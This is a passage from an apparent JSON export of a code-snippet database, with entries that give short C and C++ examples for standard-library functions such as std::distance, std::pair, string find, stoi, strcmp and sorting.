    "description": "// C++ program to demonstrate std::distance()  #include <iostream>  #include <vector>  #include <iterator>  using namespace std;  int main()  {      vector<int> v;      int i;         for (i = 0; i < 10; ++i)       {          v.push_back(i);      }         /*v contains 0 1 2 3 4 5 6 7 8 9*/        vector<int>::iterator first;      vector<int>::iterator last;         // first pointing to 0      first = v.begin();         // last pointing to 5      last = v.begin() + 5;         // Calculating no. of elements between first and last      int num = std::distance(first, last);         // Displaying num      cout << num << \"\\n\";      return 0;  } \n// Calculates the number of elements between first and last.  #include <iterator>     \t\t\t\t\t\t\t\t\t// std::distance #include <vector>     \t\t\t\t\t\t\t\t\t\t// std::vector #include <algorithm>   \t\t\t\t\t\t\t// Just if you use std::find  vector<int> arr = {2,5,3,8,1}; int size = std::distance(arr.begin(), arr.end()); \t\t\t// 5  auto it = std::find(arr.begin(), arr.end(), 8); int position = std::distance(arr.begin(), it); \t\t\t\t// 3 \n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3816,
    "keyword": null,
    "link": null,
    "title": " std distance c++",
    "description": "// C++ program to demonstrate std::distance()  #include <iostream>  #include <vector>  #include <iterator>  using namespace std;  int main()  {      vector<int> v;      int i;         for (i = 0; i < 10; ++i)       {          v.push_back(i);      }         /*v contains 0 1 2 3 4 5 6 7 8 9*/        vector<int>::iterator first;      vector<int>::iterator last;         // first pointing to 0      first = v.begin();         // last pointing to 5      last = v.begin() + 5;         // Calculating no. of elements between first and last      int num = std::distance(first, last);         // Displaying num      cout << num << \"\\n\";      return 0;  } \n// Calculates the number of elements between first and last.  #include <iterator>     \t\t\t\t\t\t\t\t\t// std::distance #include <vector>     \t\t\t\t\t\t\t\t\t\t// std::vector #include <algorithm>   \t\t\t\t\t\t\t// Just if you use std::find  vector<int> arr = {2,5,3,8,1}; int size = std::distance(arr.begin(), arr.end()); \t\t\t// 5  auto it = std::find(arr.begin(), arr.end(), 8); int position = std::distance(arr.begin(), it); \t\t\t\t// 3 \n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3817,
    "keyword": null,
    "link": null,
    "title": " std pair example",
    "description": "// pair::pair example #include <utility>      // std::pair, std::make_pair #include <string>       // std::string #include <iostream>     // std::cout  int main () {   std::pair <std::string,double> product1;                     // default constructor   std::pair <std::string,double> product2 (\"tomatoes\",2.30);   // value init   std::pair <std::string,double> product3 (product2);          // copy constructor    product1 = std::make_pair(std::string(\"lightbulbs\"),0.99);   // using make_pair (move)    product2.first = \"shoes\";                  // the type of first is string   product2.second = 39.90;                   // the type of second is double    std::cout << \"The price of \" << product1.first << \" is $\" << product1.second << '\\n';   std::cout << \"The price of \" << product2.first << \" is $\" << product2.second << '\\n';   std::cout << \"The price of \" << product3.first << \" is $\" << product3.second << '\\n';   return 0; }\n// pair::pair example #include <utility>      // std::pair, std::make_pair #include <string>       // std::string #include <iostream>     // std::cout  int main () {   std::pair <std::string,double> product1;                     // default constructor   std::pair <std::string,double> product2 (\"tomatoes\",2.30);   // value init   std::pair <std::string,double> product3 (product2);          // copy constructor    product1 = std::make_pair(std::string(\"lightbulbs\"),0.99);   // using make_pair (move)   return 0; }\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3818,
    "keyword": null,
    "link": null,
    "title": " std string find character c++",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n// string::find #include <iostream>       // std::cout #include <string>         // std::string  int main () {   std::string str (\"There are two needles in this haystack with needles.\");   std::string str2 (\"needle\");    // different member versions of find in the same order as above:   std::size_t found = str.find(str2);   if (found!=std::string::npos)     std::cout << \"first 'needle' found at: \" << found << '\\n';    found=str.find(\"needles are small\",found+1,6);   if (found!=std::string::npos)     std::cout << \"second 'needle' found at: \" << found << '\\n';    found=str.find(\"haystack\");   if (found!=std::string::npos)     std::cout << \"'haystack' also found at: \" << found << '\\n';    found=str.find('.');   if (found!=std::string::npos)     std::cout << \"Period found at: \" << found << '\\n';    // let's replace the first needle:   str.replace(str.find(str2),str2.length(),\"preposition\");   std::cout << str << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3819,
    "keyword": null,
    "link": null,
    "title": " std string to const char * c++",
    "description": "std::string a = \"string\"; const char* b = a.c_str(); \n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3820,
    "keyword": null,
    "link": null,
    "title": " std string to wstring",
    "description": "#include <locale> #include <codecvt> #include <string>  std::string str; std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter; std::wstring wstr(converter.from_bytes(str));\n",
    "reg_date": "2021-10-12T11:43:34.000Z"
  },
  {
    "id": 3821,
    "keyword": null,
    "link": null,
    "title": " std vector c++",
    "description": "#include <vector>  int main() {   std::vector<int> v;   v.push_back(10); // v = [10];   v.push_back(20); // v = [10, 20];      v.pop_back(); // v = [10];   v.push_back(30); // v = [10, 30];      auto it = v.begin();   int x = *it; // x = 10;   ++it;   int y = *it; // y = 30   ++it;   bool is_end = it == v.end(); // is_end = true      return 0; }\n#include <vector> std::vector<std::string> x;\n Vector functions in C++  --------------------  clear()  // remove all the elements of the vector container  insert()  // Inserts new elements before the element at the specified position  emplace()  // Extends the container by inserting new element at position  erase()   // Remove elements from a container from the specified position or range  push_back()  // Push the elements into a vector from the back  emplace_back() // Constructs an element in-place at the end    pop_back()  // Pop or remove elements from a vector from the back     resize()  // Changes the number of elements stored       swap() // Swap the contents of one vector with another vector of same type. Sizes may differ.\n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3822,
    "keyword": null,
    "link": null,
    "title": " std vector include c++",
    "description": "#include <vector> std::vector<std::string> x;\n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3823,
    "keyword": null,
    "link": null,
    "title": " std vector sort",
    "description": " int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nstd::sort(myvector.begin(), myvector.end());\n// C++ program to sort a vector in non-decreasing  // order.  #include <bits/stdc++.h> // Vector  #include <algorithm>  // Sort using namespace std;     int main()  {  // Initalizing the vector v with these values     vector<int> v{ 1, 5, 8, 9, 6, 7, 3, 4, 2, 0 };  // Vector is sorted in ascending order        sort(v.begin(), v.end());         return 0;  } \n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3824,
    "keyword": null,
    "link": null,
    "title": " steps",
    "description": "//how many ways to climb the stairs? // if you can hop 1/2/3 steps at a time  #include<iostream> #include<string> using namespace std;  //Recursive Function int staircase(int n){     if(n<0){            //Base Case 1         return 0;     }      if(n==0){           //Base Case 2         return 1;     }      int count = 0;     count += staircase(n-1);    //Stepping 1 step     count += staircase(n-2);    //Stepping 2 step     count += staircase(n-3);    //Stepping 3 step      return count; }   //Main  int main(){     int n;     cout<<\"Enter number of stairs\"<<endl;     cin>>n;          cout<<\"No of ways to climb stairs are \";     cout<<staircase(n)<<endl;      return 0;  } \n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3825,
    "keyword": null,
    "link": null,
    "title": " stl",
    "description": "The Standard Template Library is a software library for the C++ programming language that influenced many parts of the C++ Standard Library. It provides four components called algorithms, containers, functions, and iterators\n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3826,
    "keyword": null,
    "link": null,
    "title": " stl for sorting IN C++",
    "description": " // STL IN C++ FOR SORING #include <bits/stdc++.h>  #include <iostream>  using namespace std;  int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);      sort(arr, arr+n);  // ASCENDING SORT     reverse(arr,arr+n);   //REVERESE ARRAY      sort(arr, arr + n, greater<int>());// DESCENDING SORT   } \nsort(arr, arr + n, greater<int>())\n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3827,
    "keyword": null,
    "link": null,
    "title": " stl function to reverse an array",
    "description": "reverse(ar , ar + n) ; //ar is the array , n is the size\n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3828,
    "keyword": null,
    "link": null,
    "title": " stl iterator",
    "description": "#include <iostream> #include <vector> using namespace std;  vector<int> myvector;  for (vector<int>::iterator it = myvector.begin();      it != myvector.end();      ++it)    cout << ' ' << *it; cout << '\\n'; \n// EXAMPLE vector<string> vData; vData.push_back(\"zeroth\"); vData.push_back(\"first\"); vData.push_back(\"second\"); vData.push_back(\"third\");  std::vector<string>::iterator itData;  for (itData = vData.begin(); itData != vData.end() ; itData++) {   auto ElementIndex = itData-vData.begin();   auto ElementValue = vData[ElementIndex]; // vData[ElementIndex] = *itData   cout << \"[ElementIndex:\" << ElementIndex << \"][ElementValue:\" << ElementValue << \"]\\n\"; }  /* HEADER(S) #include <vector> #include <iostream> using namespace std; */\n#include <iostream> #include <algorithm>   template<long FROM, long TO> class Range { public:     // member typedefs provided through inheriting from std::iterator     class iterator: public std::iterator<                         std::input_iterator_tag,   // iterator_category                         long,                      // value_type                         long,                      // difference_type                         const long*,               // pointer                         long                       // reference                                       >{         long num = FROM;     public:         explicit iterator(long _num = 0) : num(_num) {}         iterator& operator++() {num = TO >= FROM ? num + 1: num - 1; return *this;}         iterator operator++(int) {iterator retval = *this; ++(*this); return retval;}         bool operator==(iterator other) const {return num == other.num;}         bool operator!=(iterator other) const {return !(*this == other);}         reference operator*() const {return num;}     };     iterator begin() {return iterator(FROM);}     iterator end() {return iterator(TO >= FROM? TO+1 : TO-1);} };   int main() {     // std::find requires an input iterator     auto range = Range<15, 25>();     auto itr = std::find(range.begin(), range.end(), 18);     std::cout << *itr << '\\n'; // 18       // Range::iterator also satisfies range-based for requirements     for(long l : Range<3, 5>()) {         std::cout << l << ' '; // 3 4 5     }     std::cout << '\\n'; }\nvector<int>::iterator ptr; \n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3829,
    "keyword": null,
    "link": null,
    "title": " stl library c++ header",
    "description": "#include<bits/stdc++.h> \n",
    "reg_date": "2021-10-12T11:43:35.000Z"
  },
  {
    "id": 3830,
    "keyword": null,
    "link": null,
    "title": " stl map remove item",
    "description": "it=mymap.find('b'); mymap.erase (it);                   // erasing by iterator  mymap.erase ('c');                  // erasing by key  it=mymap.find ('e'); mymap.erase ( it, mymap.end() );    // erasing by range \n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3831,
    "keyword": null,
    "link": null,
    "title": " stl ordering",
    "description": "int arr[] = { 1, 5, 8, 9, 6, 7, 3, 4, 2, 0 }; std::sort(arr, arr + n);\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3832,
    "keyword": null,
    "link": null,
    "title": " stl queue",
    "description": "Functions used here:    q.size() = Returns the size of queue.    q.push() = It is used to insert elements to the queue.    q.pop() = To pop out the value from the queue.    q.front() = Returns the front element of the array.    q.back() = Returns the back element of the array.\n#include <iostream> #include<queue> #include<algorithm>  using namespace std;  int main() {     queue<int>q;     q.push(10);     q.push(5);     q.push(15);     while(!q.empty())     {         cout<<q.front()<<\" \";         q.pop();     }     cout<<endl;     cout<<\"_------------------------\"<<endl;     q.push(10);     q.push(5);     q.push(15);     queue<int>q2;     q2.push(100);     q2.push(200);     q2.push(300);     q2.push(400);     q.swap(q2);     while(!q.empty())     {         cout<<q.front()<<\" \";         q.pop();     }      return 0; } \n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3833,
    "keyword": null,
    "link": null,
    "title": " stl sort in c++",
    "description": " // STL IN C++ FOR SORING #include <bits/stdc++.h>  #include <iostream>  using namespace std;  int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);      sort(arr, arr+n);  // ASCENDING SORT     reverse(arr,arr+n);   //REVERESE ARRAY      sort(arr, arr + n, greater<int>());// DESCENDING SORT   } \n int arr[]= {2,3,5,6,1,2,3,6,10,100,200,0,-10};     int n = sizeof(arr)/sizeof(int);       sort(arr,arr+n);      for(int i: arr)     {         cout << i << \" \";     } \nsort(arr, arr+n); // sorts in ascending order\nsort(arr, arr+n, greater<int>()); // sorts in descending order\n#include <algorithm>    // std::sort  int myints[] = {32,71,12,45,26,80,53,33}; // using default comparison (operator <): std::sort (myvector.begin(), myvector.begin()+4);           //(12 32 45 71)26 80 53 33  // fun returns some form of a<b std::sort (myvector.begin()+4, myvector.end(), myfunction); // 12 32 45 71(26 33 53 80)\nstd::vector s = {5, 1, 3, 6, 2,}; std::sort(s.begin(), s.end());\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3834,
    "keyword": null,
    "link": null,
    "title": " stock a file in a vector cpp",
    "description": "#include<fstream>  #include<vector>  using namespace std;  int main()  {  \tifstream file;  \tstring inputString;  \tvector<string> data;  \tfile.open(\"/path/to/file\");  \twhile(file>>inputString) //reads one string at a time  \t\tdata.push_back(inputString); //add it to data vector  \tfile.close();  }\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3835,
    "keyword": null,
    "link": null,
    "title": " stoi() c++",
    "description": "// convert string to int number. int number = stoi(str) int number = stoi(str,nulptr,10);//base 10 int number = stoi(str.c_str());\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3836,
    "keyword": null,
    "link": null,
    "title": " stoi (n)",
    "description": "std::string s = \"10\"; int i = std::stoi(s);\n#include <iostream> #include <sstream>  using namespace std;  int main()  {     string s = \"999\";      stringstream degree(s);      int x = 0;     degree >> x;      cout << \"Value of x: \" << x; }\n// stoi example #include <iostream>   // std::cout #include <string>     // std::string, std::stoi  int main () {   std::string str_dec = \"2001, A Space Odyssey\";   std::string str_hex = \"40c3\";   std::string str_bin = \"-10010110001\";   std::string str_auto = \"0x7f\";    std::string::size_type sz;   // alias of size_t    int i_dec = std::stoi (str_dec,&sz);   int i_hex = std::stoi (str_hex,nullptr,16);   int i_bin = std::stoi (str_bin,nullptr,2);   int i_auto = std::stoi (str_auto,nullptr,0);    std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";   std::cout << str_hex << \": \" << i_hex << '\\n';   std::cout << str_bin << \": \" << i_bin << '\\n';   std::cout << str_auto << \": \" << i_auto << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3837,
    "keyword": null,
    "link": null,
    "title": " stoi c++",
    "description": "int thing = std::stoi(string);\nstd::string s = \"10\"; int i = std::stoi(s);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <sstream>  using namespace std;  int main()  {     string s = \"999\";      stringstream degree(s);      int x = 0;     degree >> x;      cout << \"Value of x: \" << x; }\natoi( str.c_str() )\n// stoi example #include <iostream>   // std::cout #include <string>     // std::string, std::stoi  int main () {   std::string str_dec = \"2001, A Space Odyssey\";   std::string str_hex = \"40c3\";   std::string str_bin = \"-10010110001\";   std::string str_auto = \"0x7f\";    std::string::size_type sz;   // alias of size_t    int i_dec = std::stoi (str_dec,&sz);   int i_hex = std::stoi (str_hex,nullptr,16);   int i_bin = std::stoi (str_bin,nullptr,2);   int i_auto = std::stoi (str_auto,nullptr,0);    std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";   std::cout << str_hex << \": \" << i_hex << '\\n';   std::cout << str_bin << \": \" << i_bin << '\\n';   std::cout << str_auto << \": \" << i_auto << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:36.000Z"
  },
  {
    "id": 3838,
    "keyword": null,
    "link": null,
    "title": " stoi cpp",
    "description": "int thing = std::stoi(string);\nstd::string s = \"10\"; int i = std::stoi(s);\n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\n// EXAMPLE std::string sStringAsString = \"789\"; int iStringAsInt = atoi( sStringAsString.c_str() );  /* SYNTAX atoi( <your-string>.c_str() ) */  /* HEADERS #include <cstring> #include <string> */\n// stoi example #include <iostream>   // std::cout #include <string>     // std::string, std::stoi  int main () {   std::string str_dec = \"2001, A Space Odyssey\";   std::string str_hex = \"40c3\";   std::string str_bin = \"-10010110001\";   std::string str_auto = \"0x7f\";    std::string::size_type sz;   // alias of size_t    int i_dec = std::stoi (str_dec,&sz);   int i_hex = std::stoi (str_hex,nullptr,16);   int i_bin = std::stoi (str_bin,nullptr,2);   int i_auto = std::stoi (str_auto,nullptr,0);    std::cout << str_dec << \": \" << i_dec << \" and [\" << str_dec.substr(sz) << \"]\\n\";   std::cout << str_hex << \": \" << i_hex << '\\n';   std::cout << str_bin << \": \" << i_bin << '\\n';   std::cout << str_auto << \": \" << i_auto << '\\n';    return 0; }\n// convert Binary to Decimal in cpp #include <bits/stdc++.h> using namespace std;  int main(){     char ch[] = \"111\";     cout<<stoi(ch , 0 ,2);     return 0; }\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3839,
    "keyword": null,
    "link": null,
    "title": " stoi in c++",
    "description": "std::string s = \"10\"; int i = std::stoi(s);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \natoi( str.c_str() )\n// EXAMPLE std::string sStringAsString = \"789\"; int iStringAsInt = atoi( sStringAsString.c_str() );  /* SYNTAX atoi( <your-string>.c_str() ) */  /* HEADERS #include <cstring> #include <string> */\nstoi() //a function used to convert string to integer!\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3840,
    "keyword": null,
    "link": null,
    "title": " stone floor puzzle",
    "description": "#include<iostream>  inline int f(int exp, int balls);  int f(int exp, int balls) {        if(exp == 0 || balls == 0)         return 0 ;      return f(exp-1, balls)+ f(exp-1,balls-1)+1 ;  } int main() {     int experince{0};     int balls {0};     int floors {0};     std::cout<<\"Please enter the number of floors: \";     std::cin>>floors;     std::cout <<\"\\nPlease enter the number of balls: \";     std::cin>>balls;      while(true)     {         ++experince;         if(f(experince,balls) >= floors)             break;     }      std::cout<<\"\\nNumber experince required \"<<experince<<std::endl;     return 0 ; }\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3841,
    "keyword": null,
    "link": null,
    "title": " store arbitrarly large vector of doubles c++",
    "description": "typedef std::vector<int> int_vector; int_vector dp(10000);\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3842,
    "keyword": null,
    "link": null,
    "title": " store matrix in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int r, c, a[100][100], b[100][100], sum[100][100], i, j;      cout << \"Enter number of rows (between 1 and 100): \";     cin >> r;      cout << \"Enter number of columns (between 1 and 100): \";     cin >> c;      cout << endl << \"Enter elements of 1st matrix: \" << endl;      // Storing elements of first matrix entered by user.     for(i = 0; i < r; ++i)        for(j = 0; j < c; ++j)        {            cout << \"Enter element a\" << i + 1 << j + 1 << \" : \";            cin >> a[i][j];        }      // Storing elements of second matrix entered by user.     cout << endl << \"Enter elements of 2nd matrix: \" << endl;     for(i = 0; i < r; ++i)        for(j = 0; j < c; ++j)        {            cout << \"Enter element b\" << i + 1 << j + 1 << \" : \";            cin >> b[i][j];        }  } \n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3843,
    "keyword": null,
    "link": null,
    "title": " store string with spaces c++",
    "description": "std::string str;  std::getline( std::cin, str);\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3844,
    "keyword": null,
    "link": null,
    "title": " store vector in another vector c++",
    "description": "    Input:     vector<int> v1{ 10, 20, 30, 40, 50 };     vector<int> v2{ 100, 200, 300, 400 };      //appending elements of vector v2 to vector v1     v1.insert(v1.end(), v2.begin(), v2.end());      Output:     v1: 10 20 30 40 50 100 200 300 400     v2: 100 200 300 400\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3845,
    "keyword": null,
    "link": null,
    "title": " storing matrix in vector",
    "description": " #pragma GCC optimize(\"Ofast\") #pragma GCC target(\"avx,avx2,fma\") #pragma GCC optimization(\"unroll-loops\") #include <bits/stdc++.h> #define Code ios_base::sync_with_stdio(false); #define by cin.tie(NULL); #define black_heretic cout.tie(NULL); #define fl(n) for (int i = 0; i < n; i++) #define rl(m, n) for (int i = n; i >= m; i--) typedef long long ll; #define read(x) ll x; cin >> x using namespace std;  // Remark: NIL.  void solve() {     int i, j, n, m;     cin >>  m >> n; // rows and columns resp.     int arr[m][n];     // Original:     // vector<pair<int, int>> myVec (N, std::make_pair(-1, -1));     // The second argument to that constructor is the initial value that the N pairs will take.     vector<pair<int, int>> cordinates;     for(i = 0; i < m; ++i){         for(j = 0; j < n; ++j){             cin >> arr[i][j];             if(arr[i][j] == 1){                 cordinates.push_back(make_pair(i, j));             }         }     }     for (auto it = cordinates.begin(); it!=cordinates.end(); ++it) {         cout << it->first << \" \" << it->second << endl;     }  return; }   signed main(){     Code by black_heretic     // read(t); while(t--)         solve();     return 0; }\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3846,
    "keyword": null,
    "link": null,
    "title": " str[i] - '0'",
    "description": "The part str[i] - '0' takes the ASCII character of the corresponding digit  which are sequentially \"0123456789\" and subtracts the code for '0' from the  current character. This leaves a number in the range 0..9 as to which digit is  in that place in the string. \n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3847,
    "keyword": null,
    "link": null,
    "title": " str.length",
    "description": "// string::length #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   std::cout << \"The size of str is \" << str.length() << \" bytes.\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:43:37.000Z"
  },
  {
    "id": 3848,
    "keyword": null,
    "link": null,
    "title": " strcmp",
    "description": "#include<stdio.h>  #include<string.h>    int main()  {              char char1[] = \"coucou\";      char char2[] = \"coucou\";           \tif( strcmp(char1, char2) == 0 )        printf(\"Strings are the same\");      \telse       prinf(\"Strings are differentes\");           return 0;  }\nreturn \t>0 if first string is large     <0 if first string is short      0 if strings are equal      int strcmp ( const char * str1, const char * str2 );\nTHINK STRING_1 - STRING_2  strcmp(\"ab\",  \"ac\");  /* = -1 */ strcmp(\"abc\", \"ab\");  /* =  1 */ strcmp(\"abc\", \"abc\"); /* =  0 */\n#include <string.h>\nSTRCMP (const char *p1, const char *p2) {   const unsigned char *s1 = (const unsigned char *) p1;   const unsigned char *s2 = (const unsigned char *) p2;   unsigned char c1, c2;   do     {       c1 = (unsigned char) *s1++;       c2 = (unsigned char) *s2++;       if (c1 == '\\0')         return c1 - c2;     }   while (c1 == c2);   return c1 - c2; }\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3849,
    "keyword": null,
    "link": null,
    "title": " strcmp c++",
    "description": "#include<stdio.h>  #include<string.h>    int main()  {              char char1[] = \"coucou\";      char char2[] = \"coucou\";           \tif( strcmp(char1, char2) == 0 )        printf(\"Strings are the same\");      \telse       prinf(\"Strings are differentes\");           return 0;  }\nint strcmp ( const char * str1, const char * str2 );  // returning value | indicates // <0\tthe first character that does not match has a lower value in ptr1 than in ptr2 // 0\tthe contents of both strings are equal // >0\tthe first character that does not match has a greater value in ptr1 than in ptr2 \n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3850,
    "keyword": null,
    "link": null,
    "title": " strcmp different length",
    "description": "THINK STRING_1 - STRING_2  strcmp(\"ab\",  \"ac\");  /* = -1 */ strcmp(\"abc\", \"ab\");  /* =  1 */ strcmp(\"abc\", \"abc\"); /* =  0 */\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3851,
    "keyword": null,
    "link": null,
    "title": " strcmp in c++ header file",
    "description": "string.h\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3852,
    "keyword": null,
    "link": null,
    "title": " strcpy() in c++",
    "description": "What is strcpy() function in C++?    It is a part of <cstring> header file in c++. strcpy() is a standard library function in C/C++ and is used to copy one string to another. In C it is present in string. h header file and in C++ it is present in cstring header file.\n//When to use strcpy_s: //\tUse strcpy_s to copy a const char[] array in read and write memory //How to use strcpy_s:  //The location where the array is going to be copied to char* ptrToArray = new char[sizeof(testArray)]  //The Array that gets copied To ptrToArray; const char[] testArray = \"Test Array\";  strcpy_s(ptrToArray, sizeof(testArray), testArray);  //Modify the copied array testArray[i] = 'A' \n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3853,
    "keyword": null,
    "link": null,
    "title": " string::substr c++",
    "description": "// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3854,
    "keyword": null,
    "link": null,
    "title": " string.find in c++",
    "description": "if (string1.find(string2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; }\n// string::find #include <iostream>       // std::cout #include <string>         // std::string  int main () {   std::string str (\"There are two needles in this haystack with needles.\");   std::string str2 (\"needle\");    // different member versions of find in the same order as above:   std::size_t found = str.find(str2);   if (found!=std::string::npos)     std::cout << \"first 'needle' found at: \" << found << '\\n';    found=str.find(\"needles are small\",found+1,6);   if (found!=std::string::npos)     std::cout << \"second 'needle' found at: \" << found << '\\n';    found=str.find(\"haystack\");   if (found!=std::string::npos)     std::cout << \"'haystack' also found at: \" << found << '\\n';    found=str.find('.');   if (found!=std::string::npos)     std::cout << \"Period found at: \" << found << '\\n';    // let's replace the first needle:   str.replace(str.find(str2),str2.length(),\"preposition\");   std::cout << str << '\\n';    return 0; }\nconst char* c = \"Word\"; string str = \"WhereIsMyWordThatINeed\"; cout << \"the word is at index \" << str.find(c); //this will print \"the word is at index 9\"\n#include <iostream> #include <string> #include <algorithm> #include <functional>  int main() {     std::string in = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit,\"                      \" sed do eiusmod tempor incididunt ut labore et dolore magna aliqua\";     std::string needle = \"pisci\";     auto it = std::search(in.begin(), in.end(),                    std::boyer_moore_searcher(                        needle.begin(), needle.end()));     if(it != in.end())         std::cout << \"The string \" << needle << \" found at offset \"                   << it - in.begin() << '\\n';     else         std::cout << \"The string \" << needle << \" not found\\n\"; }\nIf not found then returns npos or -1 in int\n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3855,
    "keyword": null,
    "link": null,
    "title": " string",
    "description": "Input: strings: \"XXXXZY\", \"XXY\", \"XXZ\" Output: XXXXZY is interleaved of XXY and XXZ The string XXXXZY can be made by  interleaving XXY and XXZ String:    XXXXZY String 1:    XX Y String 2:  XX  Z  Input: strings: \"XXY\", \"YX\", \"X\" Output: XXY is not interleaved of YX and X XXY cannot be formed by interleaving YX and X. The strings that can be formed are YXX and XYX\n#A string is a type of data. There are many data types. It can be manipulated. #It can be storerd as a variable myString = \"Hello world\" #WE can print it: print(myString) #You can append it to arraY: myArr = [] myArr.append(myString) #You can find the index of a character in a string: H = myString[0] #You can use methods on it: lowercase = myString.lower() #You can convert it into a integer provided it is a numerical string myInt = int(myString) #So thats the basics, hope i haven't left anything out.\n#include <iostream> int main() { \tusing namespace std;  \tchar name[20];       //declaring string 'name'  \tcin.getline(name, sizeof(name)); //taking string input \tcout << name << endl; //printing string \treturn 0; } \n x = str(\"s1\") # x will be 's1'  y = str(2)    # y will be '2'  z = str(3.0)  # z will be '3.0'  \nHola que tal\n     char data[] = {'a', 'b', 'c'};      String str = new String(data);  \n",
    "reg_date": "2021-10-12T11:43:38.000Z"
  },
  {
    "id": 3856,
    "keyword": null,
    "link": null,
    "title": " string c++",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n// Include the string library #include <string>  // Create a string variable string greeting = \"Hello\";\n#include <string> string hello= \"hello you thre :)\";\n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      